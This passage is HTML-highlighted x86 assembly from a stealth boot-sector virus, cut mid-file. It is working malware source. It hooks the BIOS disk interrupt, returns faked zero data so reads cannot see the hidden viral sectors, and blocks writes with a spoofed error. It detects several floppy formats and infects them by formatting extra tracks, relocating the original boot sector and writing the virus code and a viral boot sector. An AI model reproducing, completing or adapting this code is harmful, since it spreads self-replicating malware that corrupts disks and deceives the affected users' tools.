        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">WB_GOON</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;pass control to ROM BIOS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;just restore all registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;and go do it</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Read hard disk sectors on Track 0, Head 0, Sec &gt; 1. If the disk is infected,</span><span class="sc0">
</span><span class="sc1">;then instead of reading the true data there, return a block of 0's, since</span><span class="sc0">
</span><span class="sc1">;0 is the data stored in a freshly formatted but unused sector. This will</span><span class="sc0">
</span><span class="sc1">;fake the caller out and keep him from knowing that the virus is hiding there.</span><span class="sc0">
</span><span class="sc1">;If the disk is not infected, return the true data stored in those sectors.</span><span class="sc0">

</span><span class="sc5">READ_HARD</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CHECK_DISK</span><span class="sc0">                      </span><span class="sc1">;see if disk is infected</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RWH_EX</span><span class="sc0">                          </span><span class="sc1">;no, let BIOS handle the read</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;else save registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;zero the first byte in the blk</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">;set up es:di and ds:si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                           </span><span class="sc1">;for a transfer</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;ax=number of sectors to read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                          </span><span class="sc1">;bytes per sector</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                              </span><span class="sc1">;number of bytes to read in ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                              </span><span class="sc1">;number of bytes to move</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                           </span><span class="sc1">;do fake read of all 0's</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;now set c flag</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;to indicate succesful read</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;restore everything and exit</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">;set to indicate successful read</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">RWH_EX</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">I13R</span><span class="sc0">                            </span><span class="sc1">;pass control to BIOS</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Handle writes to hard disk Track 0, Head 0, 1&lt;Sec&lt;8. We must stop the write if</span><span class="sc0">
</span><span class="sc1">;the disk is infected. Instead, fake the return of an error by setting carry</span><span class="sc0">
</span><span class="sc1">;and returning ah=4 (sector not found).</span><span class="sc0">

</span><span class="sc5">WRITE_HARD</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CHECK_DISK</span><span class="sc0">                      </span><span class="sc1">;see if the disk is infected</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RWH_EX</span><span class="sc0">                          </span><span class="sc1">;no, let BIOS handle it all</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">                              </span><span class="sc1">;yes, infected, so . . .</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;get flags off of stack</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                    </span><span class="sc1">;put them in current flags</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">;set the carry flag</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;and put flags back on stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;set up sector not found error</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">                                    </span><span class="sc1">;and get out of ISR</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;See if disk dl is infected already. If so, return with Z set. This</span><span class="sc0">
</span><span class="sc1">;does not assume that registers have been saved, and saves/restores everything</span><span class="sc0">
</span><span class="sc1">;but the flags.</span><span class="sc0">

</span><span class="sc5">CHECK_DISK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;save everything</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GET_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;read the boot sector</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">CD1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;act as if infected</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">CD2</span><span class="sc0">                       </span><span class="sc1">;in the event of an error</span><span class="sc0">
</span><span class="sc5">CD1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">IS_VBS</span><span class="sc0">                          </span><span class="sc1">;see if viral boot sec (set z)</span><span class="sc0">
</span><span class="sc5">CD2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;restore everything</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                              </span><span class="sc1">;except the z flag</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;This routine determines from the boot sector parameters what kind of floppy</span><span class="sc0">
</span><span class="sc1">;disk is in the drive being accessed, and calls the proper infection routine</span><span class="sc0">
</span><span class="sc1">;to infect the drive. It has no safeguards to prevent infecting an already</span><span class="sc0">
</span><span class="sc1">;infected disk. the routine CHECK_DISK must be called first to make sure you</span><span class="sc0">
</span><span class="sc1">;want to infect before you go and do it. This restores all registers to their</span><span class="sc0">
</span><span class="sc1">;initial state.</span><span class="sc0">

</span><span class="sc5">INFECT_FLOPPY</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                                   </span><span class="sc1">;save everything</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">      </span><span class="sc1">;@ of sec cnt in boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;get sector count for this disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">720</span><span class="sc0">                          </span><span class="sc1">;is it 360K? (720 sectors)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IF_1</span><span class="sc0">                            </span><span class="sc1">;no, try another possibility</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT_360K</span><span class="sc0">                     </span><span class="sc1">;yes, infect it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">IF_R</span><span class="sc0">                      </span><span class="sc1">;and get out</span><span class="sc0">
</span><span class="sc5">IF_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2400</span><span class="sc0">                         </span><span class="sc1">;is it 1.2M? (2400 sectors)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IF_2</span><span class="sc0">                            </span><span class="sc1">;no, try another possibility</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT_12M</span><span class="sc0">                      </span><span class="sc1">;yes, infect it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">IF_R</span><span class="sc0">                      </span><span class="sc1">;and get out</span><span class="sc0">
</span><span class="sc5">IF_2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1440</span><span class="sc0">                         </span><span class="sc1">;is it 720K 3 1/2"? (1440 secs)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IF_3</span><span class="sc0">                            </span><span class="sc1">;no, try another possibility</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT_720K</span><span class="sc0">                     </span><span class="sc1">;yes, infect it</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">IF_R</span><span class="sc0">                      </span><span class="sc1">;and get out</span><span class="sc0">
</span><span class="sc5">IF_3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2880</span><span class="sc0">                         </span><span class="sc1">;is it 1.44M 3 1/2"? (2880 secs)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IF_R</span><span class="sc0">                            </span><span class="sc1">;no - don't infect this disk</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">INFECT_144M</span><span class="sc0">                     </span><span class="sc1">;yes - infect it</span><span class="sc0">
</span><span class="sc5">IF_R</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                              </span><span class="sc1">;restore everyting and return</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Infect a 360 Kilobyte drive. This is done by formatting Track 40, Head 0,</span><span class="sc0">
</span><span class="sc1">;Sectors 1 to 6, putting the present boot sector in Sector 6 with the virus</span><span class="sc0">
</span><span class="sc1">;code in sectors 1 through 5, and then replacing the boot sector on the disk</span><span class="sc0">
</span><span class="sc1">;with the viral boot sector.</span><span class="sc0">

</span><span class="sc5">INFECT_360K</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FORMAT_360</span><span class="sc0">                      </span><span class="sc1">;format the required sectors</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF360_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;and go write current boot sec</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;at Track 40, Head 1, Sector 6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2806H</span><span class="sc0">                        </span><span class="sc1">;track 40, sector 6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">                        </span><span class="sc1">;BIOS write, for 1 sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF360_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_DATA</span><span class="sc0">
</span><span class="sc1">;       mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SB_BOOT_DATA</span><span class="sc0">      </span><span class="sc1">;required instead of ^ for A86</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">32H</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">;copy boot sector disk info over</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;to new boot sector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SCRATCHBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;copy drive letter there as well</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BOOT_START</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1FDH</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">DR_FLAG</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;set proper drive type</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;write new boot sector to disk</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_START</span><span class="sc0">            </span><span class="sc1">;buffer for the new boot sector</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PUT_BOOT_SEC</span><span class="sc0">                    </span><span class="sc1">;go write it to disk</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF360_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STEALTH</span><span class="sc0">               </span><span class="sc1">;buffer for 5 secs of stealth</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;drive to write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2801H</span><span class="sc0">                        </span><span class="sc1">;track 40, sector 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0305H</span><span class="sc0">                        </span><span class="sc1">;write 5 sectors</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
</span><span class="sc5">INF360_EXIT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     </span><span class="sc1">;all done</span><span class="sc0">


</span><span class="sc1">;This routine formats Track 40, Head 1 so we can infect a 360k diskette.</span><span class="sc0">
</span><span class="sc5">FORMAT_360</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">;save drive number in al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">;dl=drive no.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2801H</span><span class="sc0">                        </span><span class="sc1">;track 40, start at sector 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0506H</span><span class="sc0">                        </span><span class="sc1">;format 6 sectors</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FMT_360</span><span class="sc0">               </span><span class="sc1">;format info for this sector</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OLD_13H</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;(int 13H)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*******************************************************************************</span><span class="sc0">
</span><span class="sc1">;Infect 1.2 megabyte Floppy Disk Drive AL with this virus. This is essentially</span><span class="sc0">
</span><span class="sc1">;the same as the 360K case, except we format Track 80 instead of track 40.</span><span class="sc0">

</span><span class="sc5">INFECT_12M</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FORMAT_12M</span><span class="sc0">                      </span><span class="sc1">;format the required sectors</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">INF12M_EXIT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">SCRATCHBUF</span><span class="sc0">            </span><span class="sc1">;and go boot sector at</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">;head 1</span><span class="sc0">
